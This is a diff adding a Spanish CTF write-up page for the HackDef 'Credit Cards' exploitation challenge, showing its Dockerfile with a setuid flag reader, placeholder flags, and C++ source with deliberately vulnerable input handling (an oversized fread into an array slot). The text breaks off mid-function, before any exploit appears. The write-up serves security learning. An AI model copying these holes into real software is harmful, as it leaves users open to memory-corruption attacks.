@@ -1,0 +1,2222 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackDef Credit Cards</title>
+
+  <meta name="description" content="Resolución del reto Credit Cards del CTF de HackDef">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackDef Credit Cards">
+  <meta name="twitter:description" content="Resolución del reto Credit Cards del CTF de HackDef">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/hackdef.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackDef Credit Cards">
+  <meta property="og:description" content="Resolución del reto Credit Cards del CTF de HackDef">
+  <meta property="og:image" content="/images/otros/hackdef.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/hackdef.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackDef Credit Cards" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#flag0">Flag 0</a></li>
+        <li><a href="#flag1">Flag 1</a></li>
+        <li><a href="#flag2">Flag 2</a></li>
+        <li><a href="#flag3">Flag 3</a></li>
+        <li><a href="#flag4">Flag 4</a></li>
+        <li><a href="#flag5">Flag 5</a></li>
+        <li><a href="#flag6">Flag 6</a></li>
+        <li><a href="#flag7">Flag 7</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackDef</h4>
+    <picture><img src="/images/otros/hackdef.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Credit Cards</h2><br>
+  </header>
+  
+<section class="post" id="analysis">
+<br><h3 class="post-title">Analysis</h3><br>
+
+<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackDef/Credit Cards/mov_eax_flag">binario</a> que se otorga simplemente muestra una dirección de memoria, que ahora mismo no sabemos que es pero podria servirnos como leak del binario.</p>
+<p class="plain-text">Iniciamos desensamblando el binario, la función <code class="language-plaintext highlighter-rouge">main</code>, reserva espacio a una variable <code class="language-plaintext highlighter-rouge">varGlobal</code> y le establece como contenido la string <code class="language-plaintext highlighter-rouge">A</code> o <code class="language-plaintext highlighter-rouge">0x41</code>, luego muestra la dirección de la varible con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">3</code> funciones que ahora analizaremos.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ tree</span><span class="p">
+.
+├── Dockerfile
+├── banner_fail
+├── </span><span class="ve">build.sh</span><span class="p">
+├── </span><span class="az">chal</span><span class="p">
+│   ├── Makefile
+│   ├── </span><span class="ve">chal</span><span class="p">
+│   ├── chal.cpp
+│   ├── check_functions.cpp
+│   ├── check_functions.h
+│   ├── hackdef.cpp
+│   ├── hackdef.h
+│   ├── </span><span class="no">libc.so.6</span><span class="p"> -> </span><span class="ve">libchecks.so</span><span class="p">
+│   ├── </span><span class="ve">libchecks.so</span><span class="p">
+│   ├── </span><span class="ve">libhackdef.so</span><span class="p">
+│   ├── print_flag.cpp
+│   └── </span><span class="ve">print_flag_docker</span><span class="p">
+├── </span><span class="p">service.conf</span><span class="p">
+├── </span><span class="ve">start.sh</span><span class="p">
+├── </span><span class="ve">stop.sh</span><span class="p">
+└── </span><span class="ve">wrapper</span><span class="p">
+
+2 directories, 19 files</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat</span><span class="p"> Dockerfile
+</span><span class="o">FROM</span><span class="p"> ubuntu:</span><span class="na">latest</span><span class="p">
+
+</span><span class="o">RUN</span><span class="p"> apt-get -qq update && apt-get install -qq --no-install-recommends xinetd libssl3
+
+</span><span class="o">RUN</span><span class="p"> groupadd -g 1001 ctf
+</span><span class="o">RUN</span><span class="p"> useradd -m -u 1001 -g 1001 -s /bin/bash ctf
+
+</span><span class="o">COPY</span><span class="p"> service.conf /service.conf
+</span><span class="o">COPY</span><span class="p"> banner_fail /banner_fail
+</span><span class="o">COPY</span><span class="p"> wrapper /wrapper
+
+</span><span class="o">COPY</span><span class="p"> chal/chal /home/ctf/chal
+</span><span class="o">RUN</span><span class="p"> chown ctf:ctf /home/ctf/chal
+
+</span><span class="o">COPY</span><span class="p"> chal/libchecks.so /usr/lib/x86_64-linux-gnu/
+</span><span class="o">COPY</span><span class="p"> chal/libhackdef.so /usr/lib/x86_64-linux-gnu/
+
+</span><span class="o">COPY</span><span class="p"> chal/print_flag_docker /print_flag
+</span><span class="o">RUN</span><span class="p"> chmod 755 /print_flag
+</span><span class="o">RUN</span><span class="p"> chmod u+s /print_flag
+
+</span><span class="o">COPY</span><span class="p"> flags/flag_00.txt /
+</span><span class="o">COPY</span><span class="p"> flags/flag_01.txt /
+</span><span class="o">COPY</span><span class="p"> flags/flag_02.txt /
+</span><span class="o">COPY</span><span class="p"> flags/flag_03.txt /
+</span><span class="o">COPY</span><span class="p"> flags/flag_04.txt /
+</span><span class="o">COPY</span><span class="p"> flags/flag_05.txt /
+</span><span class="o">RUN</span><span class="p"> chmod 444 /flag_0*.txt
+
+</span><span class="o">COPY</span><span class="p"> flags/flag_06.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_ahaumx.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_bluetm.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_hackfc.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_hawkss.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_mylpwn.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_pwndir.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_snoopy.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_takzac.txt /root/
+</span><span class="o">COPY</span><span class="p"> flags/flag_yaquic.txt /root/
+</span><span class="o">RUN</span><span class="p"> chmod 400 /root/flag_*.txt
+
+</span><span class="o">EXPOSE</span><span class="p"> 1380
+
+</span><span class="o">USER</span><span class="p"> ctf
+</span><span class="o">CMD</span><span class="p"> [</span><span class="s">"/usr/sbin/xinetd"</span><span class="p">,</span><span class="s"> "-filelog"</span><span class="p">,</span><span class="s"> "/dev/stderr"</span><span class="p">,</span><span class="s"> "-dontfork"</span><span class="p">, </span><span class="s">"-f"</span><span class="p">,</span><span class="s"> "/service.conf"</span><span class="p">]</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l /print_flag
+-rwsr-xr-x 1 root root 50912 Oct 19 15:18 </span><span class="err">/print_flag</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls </span><span class="p">-l /usr/lib/x86_64-linux-gnu/libchecks.so
+-rwxr-xr-x 1 root root 900168 Oct 19 15:17 </span><span class="ve">/usr/lib/x86_64-linux-gnu/libchecks.so</span><span class="p">
+
+</span><span class="ve">❯ ls </span><span class="p">-l /usr/lib/x86_64-linux-gnu/libhackdef.so
+-rwxr-xr-x 1 root root 267520 Oct 19 15:17 </span><span class="ve">/usr/lib/x86_64-linux-gnu/libhackdef.so</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls</span><span class="p"> -l /flag_0*.txt
+.rw-r--r-- root root 31 B Sun Oct 19 16:38:10 2025  /flag_00.txt
+.rw-r--r-- root root 31 B Sun Oct 19 15:54:24 2025  /flag_01.txt
+.rw-r--r-- root root 31 B Sun Oct 19 15:54:24 2025  /flag_02.txt
+.rw-r--r-- root root 31 B Sun Oct 19 15:54:24 2025  /flag_03.txt
+.rw-r--r-- root root 31 B Sun Oct 19 15:54:24 2025  /flag_04.txt
+.rw-r--r-- root root 31 B Mon Oct 20 11:53:27 2025  /flag_05.txt
+
+</span><span class="ve">❯ cat</span><span class="p"> cat /flag_0*.txt
+hackdef{0_f4k3_fl4g_4_t35t1ng}
+hackdef{1_f4k3_fl4g_4_t35t1ng}
+hackdef{2_f4k3_fl4g_4_t35t1ng}
+hackdef{3_f4k3_fl4g_4_t35t1ng}
+hackdef{4_f4k3_fl4g_4_t35t1ng}
+hackdef{5_f4k3_fl4g_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo ls </span><span class="p">-l /root/flag_*.txt
+.rw-r--r-- root root 31 B Sat Nov  1 15:58:43 2025  /root/flag_06.txt
+.rw-r--r-- root root 37 B Sun Nov  2 10:58:22 2025  /root/flag_mylpwn.txt
+
+</span><span class="ve">❯ sudo cat </span><span class="p">/root/flag_*.txt
+hackdef{6_f4k3_fl4g_4_t35t1ng}
+hackdef{mylpwn_f4k3_fl4g_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./chal</span><span class="p">
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> cnt_checker = 1
+Checking... 550
+OK</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
+    init_buffers();
+    init_flagprocess();
+    init_seccomp();
+    init_handlers();
+    init_flags();
+
+    ignorar_signals();
+
+    std::future&lt</span><span class="no">void</span><span class="p">> fut_flag_check</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, service_flag_checker);
+
+    std::future&lt</span><span class="no">void</span><span class="p">> fut</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, service_checker);
+    std::future&lt</span><span class="no">void</span><span class="p">> fut2</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, main_menu);
+
+    fut.wait_for(std::chrono::seconds(</span><span class="mi">30</span><span class="p">));
+
+    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> TIMEOUT_CHECK_FUNC </span><span class="mi">100</span><span class="p">
+
+CheckFunc handlers[NUM_CHECK_FUNCS];
+
+</span><span class="no">void</span><span class="na"> init_handlers</span><span class="p">() {
+    handlers[</span><span class="mi">0</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_000;
+    handlers[</span><span class="mi">1</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_001;
+    handlers[</span><span class="mi">2</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_002;
+    handlers[</span><span class="mi">3</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_003;
+    .........................
+    handlers[</span><span class="mi">1157</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_1157;
+    handlers[</span><span class="mi">1158</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_1158;
+    handlers[</span><span class="mi">1159</span><span class="p">]</span><span class="o"> =</span><span class="p"> fn_1159;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> NUM_CHECK_FUNCS </span><span class="mi">290</span><span class="o"> *</span><span class="mi"> 4
+</span><span class="o">#define</span><span class="na"> TIMEOUT_CHECK_FUNC </span><span class="mi">100
+
+</span><span class="no">void</span><span class="na"> service_checker</span><span class="p">() {
+    </span><span class="no">int</span><span class="p"> cnt_checks</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">;
+
+    </span><span class="o">while</span><span class="p"> (cnt_checks</span><span class="o">++ <</span><span class="mi"> 4</span><span class="p">) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "cnt_checker = "</span><span class="o"> <<</span><span class="p"> cnt_checks </span><span class="o"><< </span><span class="p">std::endl;
+        </span><span class="no">int</span><span class="p"> op</span><span class="o"> =</span><span class="p"> randint(NUM_CHECK_FUNCS </span><span class="o">- </span><span class="mi">1</span><span class="p">);
+
+        std::future&lt</span><span class="no">bool</span><span class="p">> fut</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, execute_check, op);
+
+        </span><span class="o">if</span><span class="p"> (fut.wait_for(std::chrono::milliseconds(TIMEOUT_CHECK_FUNC)) </span><span class="o">== </span><span class="p">std::future_status::ready) {
+            </span><span class="no">bool</span><span class="p"> result </span><span class="o">= </span><span class="p">fut.get();
+
+            </span><span class="o">if</span><span class="p"> (result) {
+                std::cout</span><span class="o"> <<</span><span class="s"> "OK"</span><span class="o"> <<</span><span class="p"> std::endl;
+            } </span><span class="o">else</span><span class="p"> {
+                std::cout</span><span class="o"> <<</span><span class="s"> "WA - Algo no anda bien. Te estare vigilando..." </span><span class="o"><< </span><span class="p">std::endl;
+                salir();
+            }
+
+        } </span><span class="o">else</span><span class="p"> {
+            std::cout</span><span class="o"> <<</span><span class="s"> "Te descubri hacker!"</span><span class="o"> <<</span><span class="p"> std::endl;
+            salir();
+        }
+
+        std::this_thread::sleep_for(std::chrono::seconds(</span><span class="mi">10</span><span class="p">));
+    }
+
+    </span><span class="no">puts</span><span class="p">(</span><span class="s">"Bye!"</span><span class="p">);
+    salir();
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">bool</span><span class="na"> execute_check</span><span class="p">(</span><span class="no">int</span><span class="ra"> op</span><span class="p">) {
+    std::cout</span><span class="o"> <<</span><span class="s"> "Checking... "</span><span class="o"> <<</span><span class="p"> op</span><span class="o"> <<</span><span class="p"> std::endl;
+
+    </span><span class="o">switch</span><span class="p"> (op) {
+        </span><span class="o">case</span><span class="mi"> 0</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_000(handlers[</span><span class="mi">0</span><span class="p">]);
+        </span><span class="o">case</span><span class="mi"> 1</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_001(handlers[</span><span class="mi">1</span><span class="p">]);
+        </span><span class="o">case</span><span class="mi"> 2</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_002(handlers[</span><span class="mi">2</span><span class="p">]);
+        .............................................
+        </span><span class="o">case</span><span class="mi"> 1157</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_1157(handlers[</span><span class="mi">1157</span><span class="p">]);
+        </span><span class="o">case</span><span class="mi"> 1158</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_1158(handlers[</span><span class="mi">1158</span><span class="p">]);
+        </span><span class="o">case</span><span class="mi"> 1159</span><span class="p">:</span><span class="o"> return</span><span class="p"> check_1159(handlers[</span><span class="mi">1159</span><span class="p">]);
+
+        </span><span class="o">default</span><span class="p">:
+            std::cout </span><span class="o"><< </span><span class="s">"NO"</span><span class="o"> <<</span><span class="p"> std::endl;
+            salir();
+    }
+
+    </span><span class="o">return</span><span class="mi"> true</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> TIMEOUT_CHECK_FUNC </span><span class="mi">160</span><span class="p">
+
+</span><span class="no">bool</span><span class="na"> check_000</span><span class="p">(CheckFunc</span><span class="ra"> check</span><span class="p">) {
+    </span><span class="no">int</span><span class="p"> a</span><span class="o">=</span><span class="mi">397540806</span><span class="p">, b</span><span class="o">=</span><span class="mi">808190108</span><span class="p">, c</span><span class="o">=</span><span class="mi">948268558</span><span class="p">, d</span><span class="o">=</span><span class="mi">403076592</span><span class="p">, e</span><span class="o">=</span><span class="mi">488643755</span><span class="p">;
+    std::future&lt</span><span class="no">void</span><span class="p">> fut</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, check, </span><span class="o">&</span><span class="p">a,</span><span class="o"> &</span><span class="p">b</span><span class="p">,</span><span class="o"> &</span><span class="p">c,</span><span class="o"> &</span><span class="p">d,</span><span class="o"> &</span><span class="p">e);
+
+    </span><span class="o">if</span><span class="p"> (fut.wait_for(std::chrono::microseconds(TIMEOUT_CHECK_FUNC)) </span><span class="o">== </span><span class="p">std::future_status::ready) {
+        </span><span class="o">if</span><span class="p"> (b</span><span class="o"> !=</span><span class="mi"> 152045996</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+        </span><span class="o">if</span><span class="p"> (c</span><span class="o"> !=</span><span class="mi"> 727562417</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+        </span><span class="o">if</span><span class="p"> (d</span><span class="o"> !=</span><span class="mi"> 153545182</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+
+        </span><span class="o">return</span><span class="mi"> true</span><span class="p">;
+    }</span><span class="o"> else</span><span class="p"> {
+        </span><span class="o">return</span><span class="mi"> false</span><span class="p">;
+    }
+}
+
+</span><span class="no">bool</span><span class="na"> check_1159</span><span class="p">(CheckFunc</span><span class="ra"> check</span><span class="p">) {
+    </span><span class="no">int</span><span class="p"> a</span><span class="o">=</span><span class="mi">852726792</span><span class="p">, b</span><span class="o">=</span><span class="mi">398756715</span><span class="p">, c</span><span class="o">=</span><span class="mi">1025465896</span><span class="p">, d</span><span class="o">=</span><span class="mi">783751113</span><span class="p">, e</span><span class="o">=</span><span class="mi">391710928</span><span class="p">;
+    std::future&lt</span><span class="no">void</span><span class="p">> fut</span><span class="o"> =</span><span class="p"> std::async(std::launch::async, check,</span><span class="o"> &</span><span class="p">a,</span><span class="o"> &</span><span class="p">b,</span><span class="o"> &</span><span class="p">c,</span><span class="o"> &</span><span class="p">d, </span><span class="o">&</span><span class="p">e);
+
+    </span><span class="o">if </span><span class="p">(fut.wait_for(std::chrono::microseconds(TIMEOUT_CHECK_FUNC)) </span><span class="o">==</span><span class="p"> std::future_status::ready) {
+        </span><span class="o">if</span><span class="p"> (e</span><span class="o"> !=</span><span class="mi"> 898176514</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+        </span><span class="o">if</span><span class="p"> (a</span><span class="o"> !=</span><span class="mi"> 117814948</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+        </span><span class="o">if</span><span class="p"> (d</span><span class="o"> !=</span><span class="mi"> 87295856</span><span class="p">)</span><span class="o"> return</span><span class="mi"> false</span><span class="p">;
+
+        </span><span class="o">return</span><span class="mi"> true</span><span class="p">;
+    }</span><span class="o"> else</span><span class="p"> {
+        </span><span class="o">return</span><span class="mi"> false</span><span class="p">;
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> fn_000</span><span class="p">(</span><span class="no">int</span><span class="o"> *</span><span class="ra">a</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">b</span><span class="p">,</span><span class="no"> int </span><span class="o">*</span><span class="ra">c</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">d</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">e</span><span class="p">) {
+    </span><span class="o">*</span><span class="p">b</span><span class="o"> =</span><span class="mi"> 152045996</span><span class="p">;
+    </span><span class="o">*</span><span class="p">c</span><span class="o"> =</span><span class="mi"> 727562417</span><span class="p">;
+    </span><span class="o">*</span><span class="p">a</span><span class="o"> =</span><span class="mi"> 333394009</span><span class="p">;
+    </span><span class="o">*</span><span class="p">d</span><span class="o"> =</span><span class="mi"> 153545182</span><span class="p">;
+    </span><span class="o">*</span><span class="p">e</span><span class="o"> =</span><span class="mi"> 460636857</span><span class="p">;
+}
+
+</span><span class="no">void</span><span class="na"> fn_1159</span><span class="p">(</span><span class="no">int</span><span class="o"> *</span><span class="ra">a</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">b</span><span class="p">,</span><span class="no"> int </span><span class="o">*</span><span class="ra">c</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">d</span><span class="p">,</span><span class="no"> int</span><span class="o"> *</span><span class="ra">e</span><span class="p">) {
+    </span><span class="o">*</span><span class="p">b</span><span class="o"> =</span><span class="mi"> 76210336</span><span class="p">;
+    </span><span class="o">*</span><span class="p">c</span><span class="o"> =</span><span class="mi"> 778987935</span><span class="p">;
+    </span><span class="o">*</span><span class="p">d</span><span class="o"> =</span><span class="mi"> 87295856</span><span class="p">;
+    </span><span class="o">*</span><span class="p">a</span><span class="o"> =</span><span class="mi"> 117814948</span><span class="p">;
+    </span><span class="o">*</span><span class="p">e</span><span class="o"> =</span><span class="mi"> 898176514</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag0">
+<br><h3 class="post-title">Flag 0</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> main_menu</span><span class="p">() {
+    </span><span class="no">bool</span><span class="p"> op_leer</span><span class="o"> =</span><span class="mi"> true</span><span class="p">;
+    </span><span class="no">bool</span><span class="p"> op_reporte</span><span class="o"> =</span><span class="mi"> true</span><span class="p">;
+
+    </span><span class="o">while</span><span class="p"> (</span><span class="mi">1</span><span class="p">) {
+        </span><span class="o">int</span><span class="p"> op</span><span class="o"> =</span><span class="p"> leer_opcion();
+
+        </span><span class="o">switch</span><span class="p"> (op) {
+            </span><span class="o">case</span><span class="mi"> 1</span><span class="p">:
+                registrar_tarjeta();
+                </span><span class="o">break</span><span class="p">;
+
+            </span><span class="o">case</span><span class="mi"> 2</span><span class="p">:
+                registrar_NIP();
+                </span><span class="o">break</span><span class="p">;
+
+            </span><span class="o">case</span><span class="mi"> 3</span><span class="p">:
+                </span><span class="o">if</span><span class="p"> (op_leer) {
+                    op_leer</span><span class="o"> =</span><span class="mi"> false</span><span class="p">;
+                    consultar_NIP();
+                }</span><span class="o"> else </span><span class="p">{
+                    </span><span class="no">puts</span><span class="p">(</span><span class="s">"No no no"</span><span class="p">);
+                }
+                </span><span class="o">break</span><span class="p">;
+
+             </span><span class="o">case</span><span class="mi"> 4</span><span class="p">:
+                borrar_NIP();
+                </span><span class="o">break</span><span class="p">;
+
+            </span><span class="o">case</span><span class="mi"> 5</span><span class="p">:
+                </span><span class="no">puts</span><span class="p">(</span><span class="s">"Bye!"</span><span class="p">);
+                salir();
+                </span><span class="o">return</span><span class="p">;
+
+            </span><span class="o">case</span><span class="mi"> 0x52e6</span><span class="p">:
+                </span><span class="o">if</span><span class="p"> (op_reporte) {
+                    op_reporte </span><span class="o">=</span><span class="mi"> false</span><span class="p">;
+                    info_reporte();
+                } </span><span class="o">else</span><span class="p"> {
+                    </span><span class="no">puts</span><span class="p">(</span><span class="s">"No no no"</span><span class="p">);
+                }
+                </span><span class="o">break</span><span class="p">;
+
+            </span><span class="o">default</span><span class="p">:
+                </span><span class="no">puts</span><span class="p">(</span><span class="s">"Opcion incorrecta"</span><span class="p">);
+                </span><span class="o">return</span><span class="p">;
+        }
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">std::string tarjetas[</span><span class="mi">0x100</span><span class="p">];
+</span><span class="no">int</span><span class="p"> cnt_tarjetas </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
+
+</span><span class="no">void</span><span class="na"> registrar_tarjeta</span><span class="p">() {
+    </span><span class="o">if</span><span class="p"> (cnt_tarjetas</span><span class="o"> ==</span><span class="mi"> 0x100</span><span class="p">) {
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Maximo de tarjetas alcanzado."</span><span class="p">);
+        salir();
+    }
+
+    </span><span class="no">unsigned int</span><span class="p"> idx</span><span class="o"> =</span><span class="p"> cnt_tarjetas</span><span class="o">++</span><span class="p">;
+
+    </span><span class="o">if</span><span class="p"> (idx</span><span class="o"> <</span><span class="p"> cnt_tarjetas) {
+        std::cin</span><span class="o"> >></span><span class="p"> tarjetas[idx];
+        std::cout</span><span class="o"> <<</span><span class="s"> "OK"</span><span class="o"> <<</span><span class="p"> std::endl;
+    } </span><span class="o">else</span><span class="p"> {
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Interesante..."</span><span class="p">);
+        salir();
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">uint64_t </span><span class="p">nip_cifrado[</span><span class="mi">0x100</span><span class="p">];
+
+</span><span class="no">void</span><span class="na"> registrar_NIP</span><span class="p">() {
+    </span><span class="o">int</span><span class="p"> idx</span><span class="o"> =</span><span class="p"> leer_idx();
+
+    </span><span class="o">if</span><span class="p"> (idx</span><span class="o"> <</span><span class="p"> cnt_tarjetas) {
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Debes cifrar el NIP con AES-256-CBC usando la llave 'hackdef'."</span><span class="p">);
+        </span><span class="no">puts</span><span class="p">(</span><span class="s">"Luego obtienes el hash SHA-512."</span><span class="p">);
+        std::cout</span><span class="o"> <<</span><span class="s"> "TAM DEL HASH: "</span><span class="p">;
+        </span><span class="no">unsigned int</span><span class="p"> n</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">;
+        std::cin</span><span class="o"> >></span><span class="p"> n;
+        lee_basura_endl();
+
+        </span><span class="o">if</span><span class="p"> (n</span><span class="o"> <=</span><span class="mi"> 0x1000</span><span class="p">) {
+            std::cout</span><span class="o"> <<</span><span class="s"> "NIP: "</span><span class="p">;
+            </span><span class="no">fread</span><span class="p">(</span><span class="o">&</span><span class="p">nip_cifrado[idx],</span><span class="mi"> 1</span><span class="p">, n, stdin);
+            std::cout</span><span class="o"> <<</span><span class="s"> "OK"</span><span class="o"> <<</span><span class="p"> std::endl;
+        } </span><span class="o">else</span><span class="p"> {
